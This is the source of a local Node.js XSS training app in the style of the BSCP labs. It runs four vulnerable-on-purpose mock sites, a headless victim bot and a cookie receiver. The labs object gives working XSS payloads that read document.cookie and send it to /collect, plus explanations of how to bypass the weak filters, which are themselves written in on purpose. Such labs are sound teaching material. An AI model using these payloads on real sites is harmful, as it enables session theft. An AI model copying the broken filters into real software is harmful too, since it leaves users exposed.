const http = require('node:http');
const crypto = require('node:crypto');
const fs = require('node:fs/promises');
const path = require('node:path');

const HOST = process.env.HOST || '127.0.0.1';
const PORT = Number(process.env.PORT || 3000);
const APP_ORIGIN = process.env.APP_ORIGIN || `http://127.0.0.1:${PORT}`;
const STATIC_PNGS = new Set(['/main.png', '/1.png', '/2.png']);
const events = [];
const storedComments = [];
const jobs = new Map();
const queue = [];
let workerRunning = false;
let chromium;
try { ({ chromium } = require('playwright')); } catch (_) { /* UI remains available until Playwright is installed. */ }

const labs = {
  1: {
    title: 'Pickup location search',
    source: 'location.search → document.write()',
    goal: 'Make your search term execute JavaScript in the page despite the input filter.',
    clue: 'Trace the URL parameter to document.write. Inspect where it lands in the option element and what the filter actually removes.',
    answer: '"><\/select><SCRIPT>fetch(\'/collect?c=\'+encodeURIComponent(document.cookie))<\/SCRIPT>',
    explanation: 'The parameter is written into markup with document.write. The lowercase string <script is removed, but the match is case-sensitive. Close the attribute/select context and use uppercase SCRIPT. A script inserted by document.write runs as the browser parses the generated markup.',
    filter: 'value.replaceAll(\'<script\', \'\')',
    mode: 'document-write'
  },
  2: {
    title: 'Product keyword search',
    source: 'location.search → Function() → JavaScript string',
    goal: 'Make the search term execute an additional JavaScript statement despite quote escaping.',
    clue: 'Check the order of operations: apostrophes are escaped, but existing backslashes are not normalized. What happens if the input places a backslash before an apostrophe?',
    answer: "\\';fetch(`/collect?c=`+encodeURIComponent(document.cookie));//",
    explanation: 'The application prefixes apostrophes with a backslash but does not handle existing backslashes. The leading backslash changes how the escaped apostrophe is parsed, allowing the string to end; // comments out the suffix appended by the application.',
    filter: `value.replaceAll("'", "\\\\'")`,
    mode: 'js-string'
  },
  3: {
    title: 'Help center search',
    source: 'search parameter → server response → HTML body context',
    goal: 'Break out of the reflected HTML context using a tag and event that survive the blocklist.',
    clue: 'Inspect the raw response: the server places the search term directly in the HTML body. Common tags are blocked, but the filter does not reject every possible tag name or event handler.',
    answer: '<xss id=x onfocus="fetch(\'/collect?c=\'+encodeURIComponent(document.cookie))" tabindex=1>',
    explanation: 'This is reflected XSS: the server returns the search parameter inside the HTML response without context-appropriate encoding. The blocklist strips common tag names and onload/onerror, but allows a custom element and onfocus. The bot focuses #x after loading the reflected page.',
    filter: 'server-side blocklist for common tags + onerror/onload',
    mode: 'reflected-html'
  },
  4: {
    source: 'comment form → server-side storage → HTML response',
    title: 'Event catalogue comments',
    goal: 'Submit a comment that survives a weak HTML cleanup and executes when the page renders stored comments.',
    clue: 'The application removes only the first opening angle bracket from each comment. Try to make the first bracket harmless while leaving a second, useful tag opener behind.',
    answer: '<><img src=x onerror="fetch(\'/collect?c=\'+encodeURIComponent(document.cookie))">',
    explanation: 'The comment is stored and later inserted into the HTML response. The sanitizer removes only the first < character. In the payload, the first pair is sacrificed and the second < still begins an img element. Its deliberately broken src triggers onerror. Stored XSS executes for every visitor who loads the comments page.',
    filter: 'remove only the first < character',
    mode: 'stored-html'
  }
};

const mockSites = {
  1: { brand: 'Market Lane', mark: 'M', nav: 'Shop · Recipes · Stores', eyebrow: 'GROCERY PICKUP', headline: 'Your weekly shop, on your schedule.', description: 'Order online and choose a nearby collection point. We will have your groceries ready when you arrive.', searchLabel: 'Find a pickup location', placeholder: 'City, postcode, or store name', results: 'Choose a collection point', accent: '#31845b' },
  2: { brand: 'Northstar Goods', mark: 'N', nav: 'New arrivals · Home · Support', eyebrow: 'THOUGHTFUL EVERYDAY GOODS', headline: 'Find the useful things you will keep.', description: 'Browse practical home, travel, and desk essentials selected by our small team.', searchLabel: 'Search products', placeholder: 'Try “desk lamp” or “travel mug”', results: 'Products matching your search', accent: '#4266a8' },
  3: { brand: 'Atlas Help Center', mark: 'A', nav: 'Getting started · Orders · Contact', eyebrow: 'CUSTOMER SUPPORT', headline: 'How can we help today?', description: 'Search setup guides and answers from the Atlas support team.', searchLabel: 'Search help articles', placeholder: 'Describe what you need help with', results: 'Suggested help articles', accent: '#7d55a5' },
  4: { brand: 'Weekender', mark: 'W', nav: 'Discover · This week · About', eyebrow: 'LOCAL EVENTS', headline: 'Make room for something different.', description: 'Find small concerts, workshops, and pop-ups happening around town.', searchLabel: 'Search events', placeholder: 'Artist, event, or neighbourhood', results: 'Upcoming near you', accent: '#bd5d38' }
};

function esc(s) {
  return String(s).replace(/[&<>"']/g, ch => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[ch]);
}
function pageShell(title, body, script = '') {
  return `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>${esc(title)}</title>
<style>
:root{color-scheme:dark;--bg:#11111b;--panel:#181825;--surface:#1e1e2e;--text:#cdd6f4;--muted:#a6adc8;--blue:#89b4fa;--green:#a6e3a1;--red:#f38ba8;--border:#313244}*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font:16px/1.55 system-ui,sans-serif}main{max-width:1420px;margin:auto;padding:42px 38px 90px}h1{margin:0 0 8px;font-size:clamp(1.8rem,4vw,2.45rem)}h2{font-size:1.1rem;margin:0 0 11px}.sub,.hint,.muted{color:var(--muted)}.intro{max-width:850px;color:var(--muted);font-size:1.08rem}.grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:15px;margin-top:20px}.steps{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px;margin:20px 0}.steps div{display:grid;gap:3px;background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:13px}.steps span{font-size:.9rem;color:var(--muted)}.card{background:var(--panel);border:1px solid var(--border);border-radius:14px;padding:19px}.wide{grid-column:1/-1}.lab{display:flex;justify-content:space-between;align-items:center;gap:16px;padding:13px 0;border-top:1px solid var(--border)}.chip{display:inline-block;background:var(--surface);border:1px solid var(--border);border-radius:99px;padding:2px 9px;color:var(--green);font-size:.8rem}label{display:block;font-weight:650;margin:10px 0 5px}textarea,input,select{width:100%;padding:10px 11px;border-radius:8px;border:1px solid var(--border);background:var(--surface);color:var(--text);font:14px/1.5 ui-monospace,monospace}textarea{min-height:90px;resize:vertical}button,.button{display:inline-block;border:0;border-radius:8px;padding:10px 14px;background:var(--blue);color:#11111b;font-weight:750;cursor:pointer;margin:8px 7px 0 0;text-decoration:none}.secondary{background:var(--surface);color:var(--text);border:1px solid var(--border)}code,pre{font-family:ui-monospace,monospace}pre{white-space:pre-wrap;overflow-wrap:anywhere;background:var(--surface);padding:11px;border-radius:8px;min-height:40px;margin:8px 0}.event{padding:9px 0;border-bottom:1px solid var(--border);overflow-wrap:anywhere}.warning{border-left:3px solid var(--red);padding-left:12px}.status{min-height:1.5em;color:var(--green)}.status.error{color:var(--red)}details{border-top:1px solid var(--border);margin-top:16px;padding-top:12px}summary{cursor:pointer;color:var(--blue);font-weight:700}#target{min-height:50px;padding:12px;border-radius:8px;background:var(--surface);overflow-wrap:anywhere}@media(max-width:700px){.grid{grid-template-columns:1fr}.steps{grid-template-columns:1fr 1fr}.wide{grid-column:auto}}@media(max-width:460px){.steps{grid-template-columns:1fr}.lab{align-items:flex-start;flex-direction:column}}
.page-title{margin:0 0 18px;font-size:clamp(2rem,4.4vw,3rem);letter-spacing:-.035em}.overview-header{position:sticky;top:0;z-index:10;display:flex;align-items:center;justify-content:space-between;gap:22px;padding:16px 20px;margin-bottom:30px;background:#11111beF;border:1px solid #313244;border-radius:15px;backdrop-filter:blur(12px)}.overview-brand h1{font-size:1.55rem;margin:0;white-space:nowrap}.main-menu{display:flex;align-items:center;justify-content:flex-end;flex-wrap:wrap;gap:9px;min-width:0}.main-menu a{white-space:nowrap;text-decoration:none;color:#cdd6f4;padding:10px 14px;border-radius:9px;background:#1e1e2e;border:1px solid #313244;font-size:.92rem}.main-menu a:hover{border-color:#89b4fa;color:#89b4fa}.hero-image{display:block;width:100%;height:auto;max-height:620px;object-fit:contain;background:#1e1e2e;border:1px solid #313244;border-radius:18px;margin:0 0 40px;color:#cdd6f4}.overview-intro{max-width:960px;margin:0 auto 54px;text-align:center}.overview-intro p{color:#a6adc8;font-size:1.12rem;line-height:1.8}.overview-intro h2{font-size:1.8rem}.guide-panel{padding:42px;margin:0 0 50px;background:#181825;border:1px solid #313244;border-radius:18px}.guide-panel>h2{font-size:1.65rem;margin-bottom:24px}.guide-step{padding:24px 0;border-top:1px solid #313244}.guide-step p{max-width:1040px;margin:10px 0;color:#a6adc8;line-height:1.8}.guide-step h3{margin:0;font-size:1.1rem}.context-images{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:24px;margin:26px 0 8px}.context-images img{display:block;width:100%;height:auto;max-height:600px;object-fit:contain;background:#1e1e2e;border:1px solid #313244;border-radius:14px;color:#cdd6f4}.section-heading{margin:54px 0 18px}.section-heading h2{font-size:1.55rem}.bot-panel{padding:36px;background:#181825;border:1px solid #313244;border-radius:18px}.bot-panel p{max-width:900px;color:#a6adc8}.bot-panel textarea{min-height:120px}.lab-layout{display:grid;grid-template-columns:minmax(0,1.55fr) minmax(280px,.75fr);gap:24px;align-items:start;margin-top:24px}.mock-site{--site-accent:#4c956c;overflow:hidden;background:#fff;color:#202522;border:1px solid #dfe5df;border-radius:15px;box-shadow:0 16px 40px #0003}.mock-head{display:flex;align-items:center;justify-content:space-between;gap:14px;padding:16px 21px;border-bottom:1px solid #edf0ed}.mock-brand{display:flex;align-items:center;gap:10px;font-weight:800;font-size:1.05rem;letter-spacing:-.02em}.mock-mark{display:grid;place-items:center;width:34px;height:34px;border-radius:10px;background:var(--site-accent);color:white}.mock-nav{display:flex;gap:18px;color:#68716b;font-size:.88rem}.mock-main{padding:30px;min-height:400px}.mock-eyebrow{margin:0 0 6px;color:var(--site-accent);font-weight:800;font-size:.75rem;letter-spacing:.1em;text-transform:uppercase}.mock-main h2{font-size:1.75rem;line-height:1.2;letter-spacing:-.03em;margin:0 0 8px;color:#202522}.mock-desc{margin:0 0 20px;color:#68716b;max-width:610px}.mock-search{display:flex;gap:8px;align-items:end;padding:14px;background:#f5f7f5;border:1px solid #e6ebe6;border-radius:12px}.mock-search label{flex:1;margin:0;color:#454d47;font-size:.85rem}.mock-search input{margin-top:5px;background:white;color:#202522;border-color:#d8dfd8;font:15px/1.4 system-ui,sans-serif}.mock-search button{flex:none;margin:0;background:var(--site-accent);color:white}.mock-content{margin-top:24px;padding-top:20px;border-top:1px solid #edf0ed}.mock-content h3{margin:0 0 10px;font-size:1.02rem}.mock-results{min-height:68px;color:#465049}.mock-results #target{min-height:55px;padding:0;background:transparent;border-radius:0;color:#465049}.mock-cards{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:10px;margin-top:14px}.mock-product{min-height:84px;padding:12px;border:1px solid #e7ebe7;border-radius:10px;background:#fbfcfb}.mock-product strong,.mock-product span{display:block}.mock-product span{margin-top:4px;color:#7b847d;font-size:.82rem}.mock-comments{margin-top:22px}.mock-comment{padding:12px;margin:10px 0;background:#fbfcfb;border:1px solid #e7ebe7;border-radius:10px;color:#465049}.mock-search textarea{display:block;min-height:85px;margin-top:5px;background:white;color:#202522;border-color:#d8dfd8;font:15px/1.4 system-ui,sans-serif}.coach-panel{padding:24px;background:#181825;border:1px solid #313244;border-radius:14px}.coach-panel h2{margin-bottom:8px}.coach-panel details{margin-top:16px}.coach-panel pre{font-size:.84rem}.backlink{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}@media(max-width:960px){.overview-header{align-items:flex-start;flex-direction:column}.main-menu{justify-content:flex-start}.lab-layout{grid-template-columns:1fr}}@media(max-width:600px){main{padding:24px 16px 55px}.context-images{grid-template-columns:1fr}.mock-main{padding:20px}.mock-nav{display:none}.mock-cards{grid-template-columns:1fr}.guide-panel,.bot-panel{padding:22px}}
</style></head><body><main>${body}${script}</main></body></html>`;
}
function homePage() {
  const labLinks = Object.entries(labs).map(([id]) => `<a href="/challenge/${id}" target="_blank" rel="noopener">Lab ${id}</a>`).join('');
  const options = Object.entries(labs).map(([id, l]) => `<option value="${id}">Lab ${id} · ${esc(l.title)}</option>`).join('');
  const body = `<h1 class="page-title">BSCP XSS</h1><header class="overview-header"><nav class="main-menu" aria-label="Page navigation"><a class="menu-guide" href="#guide">Guide</a>${labLinks}<a href="/notes">XSS Notes</a><a href="#bot">Bot &amp; receiver</a></nav></header>
<img class="hero-image" src="/main.png" alt="Overview image for the BSCP XSS exercise">
<section class="overview-intro"><h2>What are you trying to achieve?</h2><p>The first BSCP stage often asks you to get JavaScript running in another user's browser and use that access to complete the lab. These exercises practise spotting the context, finding a filter bypass, and sending a verified link to a simulated victim.</p></section>
<section id="guide" class="guide-panel"><p class="mock-eyebrow">QUICK WORKFLOW</p><h2>A practical way to solve the XSS</h2>
<div class="guide-step"><h3>1 · Find where your input lands</h3><p>Send a normal search term with a unique marker, like <code>MARKER731</code>. Find it in Burp and check the response and the live page. Is it reflected by the server, added by JavaScript, or placed inside an attribute or script?</p></div>
<div class="guide-step"><h3>2 · Let Burp look for XSS</h3><p>In Repeater, right-click the parameter and choose <strong>Scan insertion point</strong>. For these BSCP-style labs, it is a strong first pass and often finds the XSS pattern for you. Check the finding and try it in the browser so you understand what context it breaks out of and why it works.</p><div class="context-images"><img src="/1.png" alt="Screenshot showing a search parameter in a Burp request or browser URL" loading="lazy"><img src="/2.png" alt="Screenshot showing the reflected marker and its surrounding context in a response or DOM" loading="lazy"></div></div>
<div class="guide-step"><h3>3 · Confirm it yourself</h3><p>Make small changes and watch what the filter removes or escapes. Prove JavaScript runs with a harmless action such as <code>alert(1)</code> or <code>print()</code>. If it fails, compare the request, response, and live DOM again.</p></div>
<div class="guide-step"><h3>4 · Send the working link</h3><p>Replace the harmless proof with the lab’s required action. Use PortSwigger’s exploit server for a PortSwigger lab; use the fake cookie receiver here. For Lab 4, post the stored comment first. Then build the link and send it to the local bot.</p></div></section>
<section id="bot" class="bot-panel"><p class="mock-eyebrow">VICTIM SIMULATOR</p><h2>Send your verified link to the bot</h2><p>Use this only after you have proved JavaScript execution in the matching exercise. For Labs 1–3, paste the verified payload to build a link. For Lab 4, post the payload as a comment first, then build a link to the stored-comments page. The bot has a fake, JavaScript-readable cookie; it cannot visit external websites.</p><label for="botlab">Exercise</label><select id="botlab">${options}</select><label for="botpayload">Final payload</label><textarea id="botpayload" spellcheck="false" placeholder="Paste the payload you verified in the exercise"></textarea><button id="build">Build victim link</button><label for="boturl">Victim link (editable)</label><input id="boturl" autocomplete="off" placeholder="Generated link appears here"><button id="send">Send link to bot</button><button id="reset" class="secondary">Clear receiver log</button><div id="status" class="status"></div><div id="jobs"></div></section>
<section id="receiver" class="card wide"><h2>Receiver log <span class="chip">/collect</span></h2><p class="muted">A successful payload sends the bot's fake <code>BSCP_SESSION</code> value here.</p><div id="events" class="muted">Waiting for data…</div></section>
<section class="card wide warning"><strong>Local training only.</strong> This app is intentionally vulnerable and uses a fake cookie. Never use real session values or send payloads to external targets.</section>`;
  const script = `<script>
const statusEl=document.querySelector('#status'),jobsEl=document.querySelector('#jobs'),eventsEl=document.querySelector('#events');
function buildBotLink(){const id=document.querySelector('#botlab').value,payload=document.querySelector('#botpayload').value,url=new URL('/challenge/'+id,location.origin);if(id!=='4')url.searchParams.set('q',payload);document.querySelector('#boturl').value=url.href;statusEl.className='status';statusEl.textContent=id==='4'?'Stored-XSS page link built. Make sure your comment is posted first.':'Link built. Submit the payload you verified in the exercise.';return url.href}
document.querySelector('#build').onclick=buildBotLink;
document.querySelector('#send').onclick=async()=>{statusEl.className='status';statusEl.textContent='Sending…';try{const r=await fetch('/bot/visit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:document.querySelector('#boturl').value})});const d=await r.json();if(!r.ok)throw Error(d.error||'Bot request failed');statusEl.textContent='Link queued: '+d.id;refresh()}catch(e){statusEl.className='status error';statusEl.textContent=e.message}};
document.querySelector('#reset').onclick=async()=>{await fetch('/reset',{method:'POST'});statusEl.textContent='Receiver log cleared.';refresh()};
async function refresh(){try{const [jr,er]=await Promise.all([fetch('/bot/jobs'),fetch('/events')]);const js=await jr.json(),es=await er.json();jobsEl.innerHTML=js.map(j=>'<div class="event"><strong>'+j.id+'</strong> · '+j.status+(j.detail?' · '+j.detail:'')+'</div>').join('')||'<p class="muted">No bot visits yet.</p>';eventsEl.replaceChildren(...es.slice().reverse().map(e=>{const d=document.createElement('div');d.className='event';d.textContent=new Date(e.at).toLocaleTimeString()+'  '+e.value;return d}));if(!es.length)eventsEl.textContent='Waiting for data…'}catch(_){}}refresh();setInterval(refresh,700);
</script>`;
  return pageShell('BSCP XSS · Training overview', body, script);
}
function challengePage(id, q) {
  const l = labs[id];
  const site = mockSites[id];
  const targetBlock = id === 1
    ? `<div class="mock-select-label">Pickup location</div><div id="target"><script>(function(){const rawParam=new URLSearchParams(location.search).get('q')||'';const value=rawParam.replaceAll('<script','');document.write('<select><option value="'+value+'">Select a pickup point</option></select>')})()</script></div>`
    : id === 3
      ? `<div id="target">${filterReflectedSearch(q)}</div>`
      : `<div id="target">${id === 2 ? 'Search for an item to see matching products.' : 'Search to see upcoming events.'}</div>`;
  const storedMarkup = id === 4 ? `<section class="mock-content"><h3>Leave a comment</h3><form method="post" action="/challenge/4/comment" class="mock-search"><label for="comment">Your comment<textarea id="comment" name="comment" required></textarea></label><button type="submit">Post comment</button></form><div class="mock-comments"><h3>Community comments</h3>${storedComments.map(c => `<article class="mock-comment">${c}</article>`).join('') || '<p>No comments yet.</p>'}</div></section>` : '';
  const body = `<div class="backlink"><a class="button secondary" href="/">← Back to overview</a><span class="chip">Exercise ${id} of 4</span></div>
<div class="lab-layout"><section class="mock-site" style="--site-accent:${site.accent}">
<header class="mock-head"><div class="mock-brand"><span class="mock-mark">${esc(site.mark)}</span>${esc(site.brand)}</div><nav class="mock-nav">${esc(site.nav)}</nav><span class="mock-account">Account</span></header>
<div class="mock-main"><p class="mock-eyebrow">${esc(site.eyebrow)}</p><h2>${esc(site.headline)}</h2><p class="mock-desc">${esc(site.description)}</p>
<form class="mock-search" method="get" action="/challenge/${id}"><label for="q">${esc(site.searchLabel)}<input id="q" name="q" value="${esc(q)}" placeholder="${esc(site.placeholder)}" autocomplete="off"></label><button type="submit">Search</button></form>
<section class="mock-content"><h3>${esc(site.results)}</h3><div class="mock-results">${targetBlock}</div><div class="mock-cards"><div class="mock-product"><strong>${id === 1 ? 'Convenient collection' : id === 2 ? 'Staff picks' : id === 3 ? 'Popular guides' : 'Editor’s picks'}</strong><span>${id === 1 ? 'Choose a time that suits you' : id === 2 ? 'Useful things, chosen well' : id === 3 ? 'Quick answers to common questions' : 'A few ideas for your week'}</span></div><div class="mock-product"><strong>${id === 1 ? 'Fresh every day' : id === 2 ? 'Thoughtful design' : id === 3 ? 'Orders and delivery' : 'Near your neighbourhood'}</strong><span>${id === 1 ? 'Local stores and local produce' : id === 2 ? 'Made for daily routines' : id === 3 ? 'Track or update an order' : 'Discover something close by'}</span></div><div class="mock-product"><strong>${id === 1 ? 'Flexible pickup' : id === 2 ? 'Easy returns' : id === 3 ? 'Talk to our team' : 'Save for later'}</strong><span>${id === 1 ? 'Change your collection time' : id === 2 ? '30 days to decide' : id === 3 ? 'We are happy to help' : 'Build your own shortlist'}</span></div></div></section>
${storedMarkup}
</div></section>
<aside class="coach-panel"><p class="mock-eyebrow">XSS PRACTICE · ${String(id).padStart(2, '0')}</p><h1>${esc(l.title)}</h1><p>${esc(l.goal)}</p><p class="muted">${id === 4 ? 'Submit a comment, then reload the page to inspect how the stored value is rendered. Once stored, it will also appear when the bot visits this page.' : 'Use the search field on the site. Start with a normal term, then make one small change at a time and observe what the page does.'}</p><details><summary>Hint</summary><p>${esc(l.clue)}</p></details><details><summary>Reveal answer</summary><p><strong>Source and sink</strong></p><p>${esc(l.source)}</p><p><strong>Payload</strong></p><pre>${esc(l.answer)}</pre><p><strong>Why it works</strong></p><p>${esc(l.explanation)}</p></details><p class="muted">${id === 4 ? 'After posting your payload, select Lab 4 in the overview and send the page link to the local bot.' : 'When you can prove execution, return to the overview to build the victim link and submit it to the local bot.'}</p></aside></div>`;
  const script = `<script>
const id=${Number(id)},q=new URLSearchParams(location.search).get('q')||'',target=document.querySelector('#target');
function filter(v){if(id===1)return v.replaceAll('<script','');if(id===2)return v.replaceAll("'", "\\\\'");return v}
const value=filter(q);
if(id===2){try{(new Function("const reflected = '"+value+"'; document.querySelector('#target').textContent = reflected ? 'Showing products for: '+reflected : 'Search for an item to see matching products.';"))()}catch(e){target.textContent='We could not load these results.'}}
</script>`;
  return pageShell(`${site.brand} · ${l.title}`, body, script);
}
function filterReflectedSearch(value) {
  return String(value).replace(/<(\/?)(script|img|svg|iframe)\b/gi, '').replace(/on(error|load)/gi, '');
}
function send(res, status, body, headers = {}) {
  res.writeHead(status, { 'Content-Type': 'text/html; charset=utf-8', 'X-Content-Type-Options': 'nosniff', 'Cache-Control': 'no-store', ...headers });
  res.end(body);
}
function json(res, status, data) {
  res.writeHead(status, { 'Content-Type': 'application/json; charset=utf-8', 'Cache-Control': 'no-store' });
  res.end(JSON.stringify(data));
}
function setDemoCookie(res) {
  res.setHeader('Set-Cookie', `BSCP_SESSION=DEMO_ONLY_${crypto.randomBytes(6).toString('hex')}; Path=/; SameSite=Lax`);
}
function readBody(req, max = 4096) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', chunk => { data += chunk; if (data.length > max) { reject(new Error('Request too large')); req.destroy(); } });
    req.on('end', () => { try { resolve(JSON.parse(data || '{}')); } catch (_) { reject(new Error('Invalid JSON')); } });
    req.on('error', reject);
  });
}
function readForm(req, max = 4096) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', chunk => { data += chunk; if (data.length > max) { reject(new Error('Form too large')); req.destroy(); } });
    req.on('end', () => resolve(new URLSearchParams(data)));
    req.on('error', reject);
  });
}
function validateBotUrl(raw) {
  let url;
  try { url = new URL(raw); } catch (_) { throw new Error('Enter a full URL to a lab page.'); }
  if (url.origin !== APP_ORIGIN || url.username || url.password) throw new Error(`The bot only accepts ${APP_ORIGIN}.`);
  if (!/^\/challenge\/[1-4]$/.test(url.pathname)) throw new Error('The bot only accepts /challenge/1 through /challenge/4.');
  if ((url.searchParams.get('q') || '').length > 2500) throw new Error('Input is too long (maximum 2500 characters).');
  return url.href;
}
function queueVisit(url) {
  const job = { id: crypto.randomBytes(3).toString('hex'), url, status: 'queued', detail: '', at: new Date().toISOString() };
  jobs.set(job.id, job); queue.push(job);
  while (jobs.size > 30) jobs.delete(jobs.keys().next().value);
  runQueue();
  return job;
}
async function runQueue() {
  if (workerRunning || !queue.length) return;
  workerRunning = true;
  while (queue.length) {
    const job = queue.shift();
    if (!chromium) { job.status = 'error'; job.detail = 'Install dependencies: npm install && npx playwright install chromium'; continue; }
    let browser;
    try {
      job.status = 'visiting';
      browser = await chromium.launch({ headless: true });
      const context = await browser.newContext({ serviceWorkers: 'block' });
      await context.route('**/*', route => {
        let origin = '';
        try { origin = new URL(route.request().url()).origin; } catch (_) {}
        return origin === APP_ORIGIN ? route.continue() : route.abort();
      });
      await context.routeWebSocket(/.*/, socket => {
        try { if (new URL(socket.url()).origin === APP_ORIGIN) return socket.connectToServer(); } catch (_) {}
        socket.close();
      });
      const page = await context.newPage();
      await page.goto(job.url, { waitUntil: 'domcontentloaded', timeout: 12000 });
      if (new URL(job.url).pathname === '/challenge/3') {
        await page.waitForTimeout(150);
        const focusTarget = page.locator('#x');
        if (await focusTarget.count()) await focusTarget.focus().catch(() => {});
      }
      await page.waitForTimeout(1100);
      job.status = 'complete';
      job.detail = 'link visited';
    } catch (error) {
      job.status = 'error';
      job.detail = String(error.message || error).slice(0, 180);
    } finally { if (browser) await browser.close().catch(() => {}); }
  }
  workerRunning = false;
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, APP_ORIGIN);
  if (req.method === 'GET' && STATIC_PNGS.has(url.pathname)) {
    try {
      const image = await fs.readFile(path.join(__dirname, path.basename(url.pathname)));
      res.writeHead(200, { 'Content-Type': 'image/png', 'X-Content-Type-Options': 'nosniff', 'Cache-Control': 'no-store' });
      return res.end(image);
    } catch (_) {
      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8', 'Cache-Control': 'no-store' });
      return res.end('Add this PNG beside server.js to display it.');
    }
  }
  if (req.method === 'GET' && url.pathname === '/') { setDemoCookie(res); return send(res, 200, homePage()); }
  if (req.method === 'GET' && url.pathname === '/notes') {
    try { const notes = await fs.readFile(path.join(__dirname, 'notes.html'), 'utf8'); return send(res, 200, notes); }
    catch (_) { return send(res, 404, '<h1>Notes page not found</h1>'); }
  }
  if (req.method === 'POST' && url.pathname === '/challenge/4/comment') {
    try {
      const form = await readForm(req);
      const comment = (form.get('comment') || '').slice(0, 2000).replace('<', '');
      if (!comment.trim()) return send(res, 400, 'Comment is required.');
      storedComments.push(comment);
      if (storedComments.length > 30) storedComments.shift();
      res.writeHead(303, { Location: '/challenge/4', 'Cache-Control': 'no-store' }); return res.end();
    } catch (error) { return send(res, 400, esc(error.message)); }
  }
  const match = url.pathname.match(/^\/challenge\/([1-4])$/);
  if (req.method === 'GET' && match) {
    setDemoCookie(res);
    return send(res, 200, challengePage(Number(match[1]), url.searchParams.get('q') || ''));
  }
  if (req.method === 'POST' && url.pathname === '/bot/visit') {
    try { const body = await readBody(req); const target = validateBotUrl(body.url); return json(res, 202, { id: queueVisit(target).id, status: 'queued' }); }
    catch (error) { return json(res, 400, { error: error.message }); }
  }
  if (req.method === 'GET' && url.pathname === '/bot/jobs') return json(res, 200, [...jobs.values()].reverse());
  if (req.method === 'GET' && url.pathname === '/events') return json(res, 200, events);
  if (req.method === 'GET' && url.pathname === '/collect') {
    events.push({ at: new Date().toISOString(), value: (url.searchParams.get('c') || '(no c parameter)').slice(0, 2048) });
    if (events.length > 60) events.shift();
    res.writeHead(204, { 'Cache-Control': 'no-store' }); return res.end();
  }
  if (req.method === 'POST' && url.pathname === '/reset') { events.length = 0; return json(res, 200, { status: 'reset' }); }
  return send(res, 404, '<h1>Not found</h1>');
});
server.listen(PORT, HOST, () => console.log(`BSCP XSS demo listening on ${APP_ORIGIN}`));
